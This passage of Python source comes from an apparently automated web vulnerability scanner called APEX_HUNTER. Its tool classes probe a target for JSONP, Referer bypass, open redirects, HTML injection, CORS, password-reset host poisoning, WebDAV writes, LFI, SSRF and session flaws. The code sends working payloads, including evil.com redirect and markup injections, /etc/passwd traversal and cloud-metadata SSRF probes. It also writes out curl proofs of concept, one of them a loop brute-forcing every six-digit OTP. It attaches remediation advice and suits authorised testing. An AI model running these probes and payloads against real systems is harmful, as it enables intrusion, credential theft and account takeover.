                poc_curl=f"curl -sk -X POST '{confirmed[0]['url']}' -d 'email=test%40test.com%0aBcc%3Aattacker%40evil.com&message=test'",
                category="Email Injection",
                remediation="Sanitize email fields. Reject CRLF characters. Use email sending libraries with strict validation."
            ))
        return profile

# ── TOOL 51: JSONP ENDPOINT DISCOVERY  (SKILL-61) ──────────
class JSONPDiscovery:
    """JSONP can bypass CSP if the domain is whitelisted."""
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("JSONP-51: JSONP endpoint discovery (CSP bypass vector)")
        base = profile.url.rstrip("/")
        found = []
        jsonp_params = ["callback","cb","jsonp","json_callback","call","fn","func","handler","wrapper"]
        test_paths = profile.api_endpoints[:20] + ["/api","/api/v1","/api/data","/api/users"]
        for ep in test_paths[:15]:
            ep_url = base+ep if ep.startswith("/") else ep
            for param in jsonp_params[:4]:
                test_url = f"{ep_url}?{param}=APEXTEST"
                code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
                ct = hdrs.get("content-type","")
                if code == 200 and ("APEXTEST(" in body or body.startswith("APEXTEST(")):
                    high(f"  JSONP ENDPOINT: {ep_url} (param: {param})")
                    found.append({"url":test_url,"param":param,"ep":ep_url})
                elif code == 200 and "javascript" in ct.lower() and "APEXTEST" in body:
                    warn(f"  JSONP candidate: {ep_url} (JS content-type, callback reflected)")
                    found.append({"url":test_url,"param":param,"ep":ep_url})
        if found:
            csp = (profile.security_headers.get("headers",{})
                   .get("content-security-policy",{}).get("value",""))
            csp_bypass = any(profile.host in csp or f.get("ep","") in csp for f in found)
            profile.findings.append(Finding(
                id="F-JSONP-001", title="JSONP Endpoint — Potential CSP Bypass",
                severity="HIGH" if csp_bypass else "MEDIUM",
                cwe="CWE-942", cvss=7.4 if csp_bypass else 5.4,
                description=f"JSONP endpoints discovered. If whitelisted in CSP, allows XSS bypass.",
                evidence="\n".join(f"{f['ep']}?{f['param']}=callback" for f in found),
                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in found[:3]),
                poc_curl=f"curl -sk '{found[0]['url']}'",
                category="JSONP/CSP",
                remediation="Replace JSONP with CORS. If JSONP required, validate callback name strictly (alphanumeric only)."
            ))
        return profile

# ── TOOL 52: REFERER-BASED ACL BYPASS  (SKILL-62) ──────────
class RefererACLBypass:
    SPOOFED_REFERERS = [
        f"https://{{host}}/admin",
        f"https://{{host}}/",
        "https://localhost/admin",
        "https://127.0.0.1/admin",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("REFERER-52: Referer-based access control bypass")
        base = profile.url.rstrip("/"); host = profile.host
        protected_paths = ["/admin","/admin/users","/admin/config",
                           "/api/admin","/internal","/management"]
        found = []
        for path in protected_paths:
            url = base + path
            baseline_code, _, _ = _fetch(url, cfg.user_agent, cfg.timeout)
            if baseline_code not in [401,403]: continue
            for ref_tpl in self.SPOOFED_REFERERS:
                referer = ref_tpl.replace("{host}", host)
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                    headers_extra={"Referer": referer, "Origin": f"https://{host}"})
                if code == 200:
                    high(f"  REFERER BYPASS: {path} accessible via Referer: {referer}")
                    found.append({"path":path,"referer":referer,"code":code})
                    break
        if found:
            profile.findings.append(Finding(
                id="F-REF-001", title="Referer-Based Access Control Bypass",
                severity="HIGH", cwe="CWE-807", cvss=8.1,
                description=f"Protected paths accessible by spoofing Referer: {[f['path'] for f in found]}",
                evidence="\n".join(f"{f['path']}: Referer={f['referer']} → {f['code']}" for f in found),
                reproduction="\n".join(f"curl -sk -H 'Referer: {f['referer']}' '{base+f['path']}'" for f in found[:2]),
                poc_curl=f"curl -sk -H 'Referer: https://{host}/admin' '{base+found[0]['path']}'",
                category="Access Control",
                remediation="Never use Referer for authorization. Implement proper session-based auth."
            ))
        return profile

# ── TOOL 53: 2FA/OTP ENDPOINT FINDER  (SKILL-63) ───────────
class TwoFAEndpointFinder:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("2FA-53: 2FA/OTP endpoint discovery + brute-force surface")
        base = profile.url.rstrip("/")
        mfa_paths = ["/api/otp","/api/2fa","/api/mfa","/api/verify",
                     "/api/auth/otp","/api/auth/verify","/api/totp",
                     "/verify","/2fa","/mfa","/otp"]
        found = []
        for path in mfa_paths:
            code, body, hdrs = _fetch(base+path, cfg.user_agent, cfg.timeout,
                method="POST", data=b'{"otp":"123456","code":"123456"}',
                headers_extra={"Content-Type":"application/json"})
            if code in [200,400,401,422]:
                found.append({"path":path,"code":code})
                ok(f"  2FA endpoint: {path} [{code}]")
                # Check rate limiting on 2FA
                codes_rl = []
                for i in range(5):
                    test_code, _, _ = _fetch(base+path, cfg.user_agent, 3,
                        method="POST",
                        data=json.dumps({"otp":str(100000+i),"code":str(100000+i)}).encode(),
                        headers_extra={"Content-Type":"application/json"})
                    codes_rl.append(test_code)
                    time.sleep(0.1)
                if 429 not in codes_rl:
                    high(f"  NO RATE LIMIT on 2FA endpoint {path}! Brute-force 000000-999999 possible!")
                    profile.findings.append(Finding(
                        id=f"F-2FA-{len(profile.findings):03d}",
                        title="2FA/OTP Brute-Force — No Rate Limiting",
                        severity="CRITICAL", cwe="CWE-307", cvss=9.8,
                        description=f"OTP endpoint {path} has no rate limiting — 1M combinations in minutes.",
                        evidence=f"5 rapid requests returned: {codes_rl}",
                        reproduction=f"for i in $(seq 0 999999); do printf -v otp '%06d' $i; curl -sk -X POST '{base+path}' -H 'Content-Type: application/json' -d '{{\"otp\":\"'$otp'\"}}'; done",
                        poc_curl=f"curl -sk -X POST '{base+path}' -H 'Content-Type: application/json' -d '{{\"otp\":\"000000\"}}'",
                        category="2FA/MFA",
                        remediation="Rate-limit OTP attempts to 5/hour per account. Lock after 10 failures. Use time-based OTP with short window."
                    ))
        return profile

# ── TOOL 54: ERROR PAGE INTELLIGENCE  (SKILL-64) ───────────
class ErrorPageIntelligence:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("ERRPAGE-54: Error page version/stack trace intelligence harvesting")
        base = profile.url.rstrip("/")
        trigger_urls = [
            base+"/'\"<>{}|\\^`",  # special chars
            base+"/nonexistent_apex_test_xyz_123",
            base+"/api/v1/../../../../etc/passwd",
            base+"?" + "a="*1000,  # long query
        ]
        findings_list = []
        for url in trigger_urls:
            try:
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
                if code in [400,404,500,503]:
                    # Stack trace
                    if re.search(r'at\s+[\w\.]+\([\w\.]+\.java:\d+\)|Traceback.*most recent|' +
                                 r'Stack trace:|at System\.Web\.|Microsoft\.AspNet|' +
                                 r'TypeError:|ReferenceError:', body, re.S):
                        high(f"  STACK TRACE EXPOSED: HTTP {code} at {url[:60]}")
                        findings_list.append({"type":"stack_trace","url":url,"code":code,"preview":body[:200]})
                    # Version disclosure
                    for pat, label in [
                        (r'Apache/(\d+\.\d+\.\d+)', "Apache"),
                        (r'nginx/(\d+\.\d+\.\d+)', "Nginx"),
                        (r'PHP/(\d+\.\d+\.\d+)', "PHP"),
                        (r'ASP\.NET version (\d+\.\d+)', "ASP.NET"),
                        (r'Python/(\d+\.\d+\.\d+)', "Python"),
                        (r'Express (\d+\.\d+\.\d+)', "Express"),
                        (r'Tomcat/(\d+\.\d+\.\d+)', "Tomcat"),
                    ]:
                        m = re.search(pat, body + str(hdrs), re.I)
                        if m:
                            warn(f"  VERSION DISCLOSURE: {label} {m.group(1)} in error page")
                            findings_list.append({"type":f"version_{label.lower()}","version":m.group(1),"url":url})
            except Exception: pass
        if findings_list:
            stack = [f for f in findings_list if f["type"]=="stack_trace"]
            vers  = [f for f in findings_list if f["type"].startswith("version_")]
            profile.findings.append(Finding(
                id="F-ERR-001", title="Sensitive Error Page Information Disclosure",
                severity="MEDIUM" if not stack else "HIGH",
                cwe="CWE-209", cvss=5.3,
                description=f"Error pages expose: {len(stack)} stack traces, {len(vers)} version strings.",
                evidence="\n".join(f"{f['type']}: {f.get('preview','')[:100] or f.get('version','')}" for f in findings_list[:5]),
                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in findings_list[:3]),
                poc_curl=f"curl -sk '{findings_list[0]['url']}'",
                category="Information Disclosure",
                remediation="Configure custom error pages. Disable stack traces in production. Hide version headers."
            ))
        return profile

# ── TOOL 55: OPEN REDIRECT CHAIN  (SKILL-65) ───────────────
class OpenRedirectChain:
    """Multi-hop redirect chain to arbitrary external domain."""
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("REDIR-55: Open redirect chain + OAuth redirect_uri abuse")
        base = profile.url.rstrip("/")
        redirect_params = ["next","return","returnurl","redirect","goto","url","back","continue","redir"]
        chain_payloads = [
            "//evil.com", "////evil.com", "/\\evil.com",
            "https://evil.com%23." + profile.host,
            "https://evil.com%3F." + profile.host,
            "https://" + profile.host + "@evil.com",
            "https://evil.com/" + profile.host,
        ]
        found = []
        for param in redirect_params:
            for payload in chain_payloads:
                url = f"{base}?{param}={urllib.parse.quote(payload, safe='')}"
                code, _, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
                loc = hdrs.get("location","")
                if "evil.com" in loc or (code in [301,302,307] and loc and profile.host not in loc):
                    high(f"  OPEN REDIRECT CHAIN: ?{param}={payload} → {loc}")
                    found.append({"param":param,"payload":payload,"location":loc,"url":url})
        # OAuth redirect_uri bypass
        for auth_path in ["/oauth/authorize","/api/oauth","/auth/oauth2"]:
            for payload in chain_payloads[:3]:
                test_url = f"{base}{auth_path}?response_type=code&client_id=test&redirect_uri={urllib.parse.quote(payload)}"
                code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
                if code in [301,302] and "evil.com" in hdrs.get("location",""):
                    high(f"  OAUTH REDIRECT_URI BYPASS: {auth_path}")
                    found.append({"param":"redirect_uri","payload":payload,"location":hdrs.get("location",""),"url":test_url})
        if found and len(found) > len(profile.open_redirects):
            profile.open_redirects.extend([f["url"] for f in found])
            profile.findings.append(Finding(
                id="F-REDIR-CHAIN-001", title="Open Redirect Chain — Multi-Vector",
                severity="MEDIUM", cwe="CWE-601", cvss=6.1,
                description=f"Open redirect bypasses: {list(set(f['payload'] for f in found))}",
                evidence="\n".join(f"{f['param']}={f['payload']} → {f['location']}" for f in found[:5]),
                reproduction="\n".join(f"curl -sk -I '{f['url']}'" for f in found[:3]),
                poc_curl=f"curl -sk -I '{found[0]['url']}'",
                category="Open Redirect",
                remediation="Validate redirect destinations against strict allowlist. Never use user input as redirect URL."
            ))
        return profile

# ── TOOL 56: HTML INJECTION / DANGLING MARKUP  (SKILL-66) ──
class HTMLInjectionScanner:
    HTML_PAYLOADS = [
        ("<b>HTMLTEST</b>", "<b>HTMLTEST</b>"),
        ("<h1>HTMLTEST", "<h1>HTMLTEST"),
        ('<a href="https://evil.com">click</a>', ">click</a>"),
        ('<img src="https://evil.com/pixel.gif"', 'evil.com/pixel.gif'),
        ('<form action="https://evil.com">', 'evil.com'),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HTMLINJ-56: HTML injection + dangling markup detection")
        base = profile.url.rstrip("/")
        params = list(set(profile.parameters[:8] + ["name","message","search","q","input","text","comment"]))
        found = []
        for param in params[:8]:
            for payload, indicator in self.HTML_PAYLOADS:
                test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
                # Reflected unencoded?
                if indicator in body and html.escape(indicator) not in body:
                    sev = "HIGH" if "form" in payload or "img" in payload else "MEDIUM"
                    high(f"  HTML INJECTION: param '{param}' payload reflected unencoded ({sev})")
                    found.append({"param":param,"payload":payload,"url":test_url,"sev":sev})
                    break
        if found:
            dangling = [f for f in found if "img" in f["payload"] or "form" in f["payload"]]
            profile.findings.append(Finding(
                id="F-HTML-001", title="HTML Injection / Dangling Markup",
                severity="HIGH" if dangling else "MEDIUM",
                cwe="CWE-80", cvss=6.1,
                description=f"HTML injected unencoded in params: {[f['param'] for f in found]}",
                evidence="\n".join(f"{f['param']}: {f['payload'][:60]}" for f in found[:5]),
                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in found[:3]),
                poc_curl=f"curl -sk '{found[0]['url']}'",
                category="HTML Injection",
                remediation="HTML-encode all user-controlled output. Implement strict CSP. Use a templating engine with auto-escaping."
            ))
        return profile

# ── TOOL 57: CORS PREFLIGHT ANALYZER  (SKILL-67) ───────────
class CORSPreflightAnalyzer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CORS-PRE-57: CORS preflight OPTIONS analysis")
        issues = []
        for ep in [profile.url] + [profile.url.rstrip("/")+p for p in profile.api_endpoints[:5]]:
            code, _, hdrs = _fetch(ep, cfg.user_agent, cfg.timeout, method="OPTIONS",
                headers_extra={"Origin": f"https://evil.com",
                               "Access-Control-Request-Method": "DELETE",
                               "Access-Control-Request-Headers": "Authorization,X-Custom-Header"})
            acao = hdrs.get("access-control-allow-origin","")
            acam = hdrs.get("access-control-allow-methods","")
            acah = hdrs.get("access-control-allow-headers","")
            acac = hdrs.get("access-control-allow-credentials","")
            acma = hdrs.get("access-control-max-age","")
            if acao == "*" or acao == "https://evil.com":
                high(f"  CORS PREFLIGHT OPEN: {ep} — ACAO={acao} ACAM={acam}")
                issues.append({"url":ep,"acao":acao,"acam":acam,"acac":acac})
            if "DELETE" in acam.upper() or "PUT" in acam.upper():
                warn(f"  CORS allows dangerous methods: {acam} at {ep}")
            if acma and int(acma or 0) > 86400:
                warn(f"  CORS max-age very long: {acma}s — poisoned preflight cached!")
        if issues:
            profile.findings.append(Finding(
                id="F-CORS-PRE-001", title="CORS Preflight Misconfiguration",
                severity="HIGH", cwe="CWE-942", cvss=7.4,
                description=f"Preflight allows cross-origin requests from evil.com.",
                evidence="\n".join(f"{i['url']}: ACAO={i['acao']} ACAM={i['acam']}" for i in issues),
                reproduction=f"curl -sk -X OPTIONS '{issues[0]['url']}' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: DELETE' -I",
                poc_curl=f"curl -sk -X OPTIONS '{issues[0]['url']}' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: DELETE' -I",
                category="CORS",
                remediation="Validate Origin in preflight. Only allow safe methods (GET, POST) cross-origin unless explicitly required."
            ))
        return profile

# ── TOOL 58: INSECURE PASSWORD RESET  (SKILL-68) ───────────
class PasswordResetAnalyzer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("PWRESET-58: Insecure password reset flow analysis")
        base = profile.url.rstrip("/")
        reset_paths = ["/api/password/reset","/api/forgot-password","/forgot-password",
                       "/api/auth/reset","/auth/forgot","/api/v1/password/reset",
                       "/password-reset","/reset","/api/reset-password"]
        found = []
        for path in reset_paths:
            url = base + path
            # Test with host header injection
            code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                method="POST",
                data=json.dumps({"email":"victim@example.com"}).encode(),
                headers_extra={"Content-Type":"application/json",
                               "Host": "evil.com",
                               "X-Forwarded-Host": "evil.com"})
            if code in [200,201,202]:
                if re.search(r'sent|email|link|password|reset|check', body, re.I):
                    high(f"  PASSWORD RESET: {path} accepts requests with poisoned Host/X-Forwarded-Host!")
                    found.append({"path":path,"url":url,"type":"host_poisoning"})
            # Test token predictability — request 2 tokens quickly
            tokens = []
            for _ in range(2):
                tc, tb, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                    method="POST",
                    data=json.dumps({"email":"test@test.com"}).encode(),
                    headers_extra={"Content-Type":"application/json"})
                token_match = re.search(r'token["\s:=]+([a-zA-Z0-9]{6,32})', tb, re.I)
                if token_match: tokens.append(token_match.group(1))
                time.sleep(0.1)
            if len(tokens) == 2 and tokens[0] == tokens[1]:
                high(f"  PASSWORD RESET TOKEN REUSE: same token generated twice at {path}!")
                found.append({"path":path,"url":url,"type":"token_reuse","tokens":tokens})
            elif len(tokens) == 2:
                # Check if tokens share prefix (low entropy)
                common_prefix = 0
                for a,b in zip(tokens[0],tokens[1]):
                    if a==b: common_prefix+=1
                    else: break
                if common_prefix > len(tokens[0])//2:
                    warn(f"  PASSWORD RESET: tokens share long prefix ({common_prefix}/{len(tokens[0])}) — low entropy?")
        if found:
            profile.findings.append(Finding(
                id="F-PWRESET-001", title="Insecure Password Reset Flow",
                severity="HIGH" if any(f["type"]=="host_poisoning" for f in found) else "MEDIUM",
                cwe="CWE-640", cvss=8.1,
                description=f"Password reset issues: {[f['type'] for f in found]}",
                evidence="\n".join(f"{f['type']}: {f['url']}" for f in found),
                reproduction=f"curl -sk -X POST '{found[0]['url']}' -H 'X-Forwarded-Host: evil.com' -H 'Content-Type: application/json' -d '{{\"email\":\"victim@target.com\"}}'",
                poc_curl=f"curl -sk -X POST '{found[0]['url']}' -H 'X-Forwarded-Host: evil.com' -H 'Content-Type: application/json' -d '{{\"email\":\"victim@{profile.host}\"}}'",
                category="Password Reset",
                remediation="Bind reset tokens to IP+User-Agent. Ignore Host override headers. Use cryptographically random tokens (256-bit)."
            ))
        return profile

# ── TOOL 59: WEBDAV MISCONFIGURATION  (SKILL-69) ───────────
class WebDAVScanner:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("WEBDAV-59: WebDAV misconfiguration (PROPFIND, PUT, MOVE)")
        base = profile.url.rstrip("/")
        issues = []
        # PROPFIND test
        propfind_body = b'<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>'
        code, body, hdrs = _fetch(base+"/", cfg.user_agent, cfg.timeout,
            method="PROPFIND", data=propfind_body,
            headers_extra={"Content-Type":"application/xml","Depth":"1"})
        if code == 207 and "multistatus" in body.lower():
            high(f"  WEBDAV PROPFIND: Returns 207 Multi-Status — directory listing possible!")
            issues.append({"method":"PROPFIND","code":207,"detail":"directory listing"})
        # PUT test — try to upload a test file
        test_content = b"APEX_HUNTER WebDAV test"
        put_code, put_body, _ = _fetch(base+"/apex_webdav_test.txt", cfg.user_agent, cfg.timeout,
            method="PUT", data=test_content,
            headers_extra={"Content-Type":"text/plain"})
        if put_code in [200,201,204]:
            high(f"  WEBDAV PUT: File uploaded to /apex_webdav_test.txt — arbitrary write!")
            issues.append({"method":"PUT","code":put_code,"detail":"arbitrary file write"})
            # Clean up
            _fetch(base+"/apex_webdav_test.txt", cfg.user_agent, cfg.timeout, method="DELETE")
        if issues:
            profile.findings.append(Finding(
                id="F-WEBDAV-001", title="WebDAV Misconfiguration",
                severity="CRITICAL" if any(i["method"]=="PUT" for i in issues) else "HIGH",
                cwe="CWE-749", cvss=9.8 if any(i["method"]=="PUT" for i in issues) else 7.5,
                description=f"WebDAV enabled: {[i['method'] for i in issues]}",
                evidence="\n".join(f"{i['method']}: HTTP {i['code']} — {i['detail']}" for i in issues),
                reproduction=f"curl -sk -X PROPFIND '{base}/' -H 'Depth: 1' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><D:propfind xmlns:D=\"DAV:\"><D:allprop/></D:propfind>'",
                poc_curl=f"curl -sk -X PROPFIND '{base}/' -H 'Depth: 1'",
                category="WebDAV",
                remediation="Disable WebDAV unless required. Restrict PUT/DELETE to authenticated users."
            ))
        return profile

# ── TOOL 60: CONTENT-TYPE CONFUSION  (SKILL-70) ────────────
class ContentTypeConfusion:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CTCONF-60: Content-type confusion attack")
        base = profile.url.rstrip("/")
        issues = []
        # Test API endpoints that expect JSON but also accept text/html
        for ep in (profile.api_endpoints[:10] or ["/api"]):
            url = base+ep if ep.startswith("/") else ep
            test_payload = b'{"test":"<script>alert(1)</script>"}'
            for ct in ["text/html","text/plain","application/x-www-form-urlencoded","text/xml"]:
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                    method="POST", data=test_payload,
                    headers_extra={"Content-Type":ct,"Accept":"application/json"})
                resp_ct = hdrs.get("content-type","").lower()
                # If JSON API returns HTML content-type when we send HTML content-type
                if code in [200,201] and "html" in resp_ct and ct=="text/html":
                    warn(f"  CT CONFUSION: {ep} mirrors Content-Type — XSS amplification possible")
                    issues.append({"ep":ep,"sent_ct":ct,"resp_ct":resp_ct})
                # If JSON API reflects input as HTML without encoding
                if code==200 and "text/html" in resp_ct and "<script>" in body:
                    high(f"  REFLECTED XSS via Content-Type confusion at {ep}!")
                    issues.append({"ep":ep,"sent_ct":ct,"resp_ct":resp_ct,"xss":True})
        if issues:
            xss_issues = [i for i in issues if i.get("xss")]
            profile.findings.append(Finding(
                id="F-CT-001", title="Content-Type Confusion Attack",
                severity="HIGH" if xss_issues else "MEDIUM",
                cwe="CWE-116", cvss=7.4 if xss_issues else 5.3,
                description=f"API reflects Content-Type from request, enabling type confusion.",
                evidence="\n".join(f"{i['ep']}: sent {i['sent_ct']} → resp {i['resp_ct']}" for i in issues[:5]),
                reproduction="\n".join(f"curl -sk -X POST '{base+i['ep']}' -H 'Content-Type: text/html' -d '<script>alert(1)</script>'" for i in issues[:2]),
                poc_curl=f"curl -sk -X POST '{base+(issues[0]['ep'])}' -H 'Content-Type: text/html' -d '<script>alert(1)</script>'",
                category="Content-Type",
                remediation="Set explicit Content-Type in all responses. Never mirror request Content-Type."
            ))
        return profile

# ── TOOL 61: INTERNAL SERVICE DISCOVERY VIA SSRF  (SKILL-71) ─
class InternalServiceDiscovery:
    """Uses SSRF params to map internal services (non-exploiting scan)."""
    INTERNAL_SERVICES = [
        ("169.254.169.254",80,"AWS/Azure/GCP metadata"),
        ("localhost",6379,"Redis"),("127.0.0.1",6379,"Redis"),
        ("localhost",27017,"MongoDB"),("127.0.0.1",27017,"MongoDB"),
        ("localhost",9200,"Elasticsearch"),("127.0.0.1",9200,"Elasticsearch"),
        ("localhost",8080,"Internal HTTP"),("127.0.0.1",8080,"Internal HTTP"),
        ("localhost",3306,"MySQL"),("127.0.0.1",5432,"PostgreSQL"),
        ("localhost",11211,"Memcached"),("127.0.0.1",2375,"Docker API"),
        ("localhost",9090,"Prometheus"),("127.0.0.1",8500,"Consul"),
        ("localhost",4001,"etcd"),("127.0.0.1",2379,"etcd"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("INTERNALSVC-61: Internal service map via SSRF candidates")
        if not profile.ssrf_params:
            info("  No SSRF params found — skipping internal service scan")
            return profile
        base = profile.url.rstrip("/")
        param = profile.ssrf_params[0]
        reachable = []
        for host_int, port, label in self.INTERNAL_SERVICES:
            ssrf_url = f"http://{host_int}:{port}/"
            test_url = f"{base}?{param}={urllib.parse.quote(ssrf_url)}"
            t0 = time.time()
            code, body, _ = _fetch(test_url, cfg.user_agent, 4)
            elapsed = time.time() - t0
            if code in [200,400,401,403] or (elapsed < 1.5 and code != 0):
                warn(f"  INTERNAL SERVICE REACHABLE: {label} ({host_int}:{port}) via SSRF param '{param}'")
                reachable.append({"host":host_int,"port":port,"label":label,"code":code,"time":round(elapsed,2)})
        if reachable:
            profile.findings.append(Finding(
                id="F-INTNET-001", title="Internal Network Service Discovery via SSRF",
                severity="CRITICAL", cwe="CWE-918", cvss=9.8,
                description=f"Internal services reachable: {[r['label'] for r in reachable]}",
                evidence="\n".join(f"{r['label']} ({r['host']}:{r['port']}): HTTP {r['code']} in {r['time']}s" for r in reachable),
                reproduction="\n".join(f"curl -sk '{base}?{param}=http://{r['host']}:{r['port']}/'" for r in reachable[:3]),
                poc_curl=f"curl -sk '{base}?{param}=http://169.254.169.254/latest/meta-data/'",
                category="SSRF/Internal Network",
                remediation="Use SSRF protection library. Block RFC1918+metadata IPs at WAF/egress firewall."
            ))
        return profile

# ── TOOL 62: MASS SUBDOMAIN LIVE CHECK  (SKILL-72) ─────────
class SubdomainLiveCheck:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SUBLIVE-62: Deep subdomain live check + service fingerprinting")
        all_subs = list(set(profile.subdomains + profile.ct_subdomains))
        resolver = DNSResolver()
        live_services = []
        for sub in all_subs[:40]:
            ip = resolver.resolve(sub)
            if ip == "NXDOMAIN": continue
            for port, scheme in [(443,"https"),(80,"http"),(8080,"http"),(8443,"https")]:
                code, body, hdrs = _fetch(f"{scheme}://{sub}:{port}/",
                                          cfg.user_agent, 5)
                if code and code != 0:
                    server = hdrs.get("server","")
                    powered = hdrs.get("x-powered-by","")
                    tech = []
                    if "wordpress" in body.lower(): tech.append("WordPress")
                    if "jenkins" in body.lower(): tech.append("Jenkins")
                    if "grafana" in body.lower(): tech.append("Grafana")
                    if "kibana" in body.lower(): tech.append("Kibana")
                    if "gitlab" in body.lower(): tech.append("GitLab")
                    if tech or port != 443:
                        warn(f"  LIVE SUBDOMAIN: {sub}:{port} [{code}] {server} {tech}")
                        live_services.append({"sub":sub,"port":port,"code":code,"tech":tech,"server":server})
                    break
        if live_services:
            hidden = [s for s in live_services if s["port"] in [8080,8443]]
            if hidden:
                profile.findings.append(Finding(
                    id="F-SUBLIVE-001", title="Non-Standard Port Services on Subdomains",
                    severity="MEDIUM", cwe="CWE-200", cvss=5.3,
                    description=f"{len(hidden)} subdomains expose services on non-standard ports.",
                    evidence="\n".join(f"{s['sub']}:{s['port']} [{s['code']}] {s['server']} {s['tech']}" for s in hidden[:10]),
                    reproduction="\n".join(f"curl -sk 'http://{s['sub']}:{s['port']}/'" for s in hidden[:5]),
                    poc_curl=f"curl -sk 'http://{hidden[0]['sub']}:{hidden[0]['port']}/'",
                    category="Attack Surface",
                    remediation="Audit all services on non-standard ports. Apply same security controls as primary domain."
                ))
        return profile

# ── TOOL 63: LFI/PATH TRAVERSAL  (SKILL-73) ────────────────
class LFIScanner:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("LFI-63: Local File Inclusion / path traversal")
        base = profile.url.rstrip("/")
        params = list(set(profile.parameters[:8] + ["file","path","page","template","view","include","doc","document","src","filename","img","image"]))
        confirmed = []
        for param in params[:10]:
            for payload in PAYLOADS_LFI[:8]:
                url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                if re.search(r'root:.*:0:0:|bin:.*:1:1:|daemon:.*:/usr/sbin', body):
                    high(f"  LFI CONFIRMED: {param}={payload} → /etc/passwd leaked!")
                    confirmed.append({"param":param,"payload":payload,"url":url})
                    break
                elif re.search(r'\[boot loader\]|extension_dir|allow_url_include', body, re.I):
                    high(f"  LFI CONFIRMED: {param}={payload} → Windows/PHP config!")
                    confirmed.append({"param":param,"payload":payload,"url":url})
                    break
                # POST
                pc, pb, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                    method="POST", data=urllib.parse.urlencode({param:payload}).encode())
                if re.search(r'root:.*:0:0:|bin:.*:1:1:', pb):
                    high(f"  LFI POST: {param}={payload}")
                    confirmed.append({"param":param,"payload":payload,"url":base+"[POST]"})
                    break
        if confirmed:
            profile.findings.append(Finding(
                id="F-LFI-001", title="Local File Inclusion (LFI)",
                severity="CRITICAL", cwe="CWE-22", cvss=9.1,
                description=f"LFI confirmed reading /etc/passwd via params: {[c['param'] for c in confirmed]}",
                evidence="\n".join(f"{c['param']}: {c['payload']}" for c in confirmed[:5]),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:3]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="LFI",
                remediation="Never pass user input to file system functions. Use allow-list of permitted files."
            ))
        return profile

# ── TOOL 64: COOKIE JAR OVERFLOW / SESSION FIXATION  (SKILL-74) ─
class SessionSecurityAnalyzer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SESSION-64: Session fixation + cookie jar overflow analysis")
        base = profile.url.rstrip("/")
        issues = []
        # Session fixation: preset a session cookie and see if it's accepted
        preset_sid = "APEXHUNTER_FIXED_SESSION_12345"
        code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout,
            headers_extra={"Cookie": f"session={preset_sid}; PHPSESSID={preset_sid}; JSESSIONID={preset_sid}"})
        # If server returns same session ID back, it's accepting our preset one
        set_cookie = hdrs.get("set-cookie","")
        if preset_sid in set_cookie or (not set_cookie and code == 200):
            if preset_sid in set_cookie:
                high(f"  SESSION FIXATION: Server echoes back preset session ID!")
                issues.append({"type":"fixation","detail":"preset SID echoed"})
        # Cookie scope: check if session cookies have too broad domain
        for c in profile.cookie_results:
            name = c.get("name","")
            if re.search(r'session|sid|auth|token', name, re.I):
                if not c.get("issues"):
                    ok(f"  Session cookie '{name}' properly secured")
                else:
                    warn(f"  Session cookie '{name}' issues: {c.get('issues')}")
                    issues.append({"type":"cookie_flags","name":name,"issues":c.get("issues")})
        # Test for session in URL
        for ep in profile.api_endpoints[:10]:
            url = base+ep if ep.startswith("/") else ep
            if re.search(r'[?&](session|sid|token|auth|PHPSESSID|JSESSIONID)=', url, re.I):
                high(f"  SESSION IN URL: {url[:80]}")
                issues.append({"type":"session_in_url","url":url})
        if any(i["type"]=="session_in_url" for i in issues):
            profile.findings.append(Finding(
                id="F-SES-001", title="Session Token Exposed in URL",
                severity="HIGH", cwe="CWE-598", cvss=7.5,
                description="Session tokens visible in URLs — logged in server logs, browser history, Referer.",
                evidence="\n".join(i.get("url","") for i in issues if i["type"]=="session_in_url"),
                reproduction="# Check browser address bar and server access logs",
                poc_curl=f"# Session token visible in URLs listed above",
                category="Session Management",
                remediation="Use POST body or Authorization header for tokens. Never put secrets in GET parameters."
            ))
        return profile

# ── TOOL 65: SECURITY.TXT & VDP DISCOVERY  (SKILL-75) ──────
class VDPDiscovery:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("VDP-65: security.txt + VDP/bug bounty scope discovery")
        base = profile.url.rstrip("/")
        vdp_paths = ["/.well-known/security.txt","/security.txt",
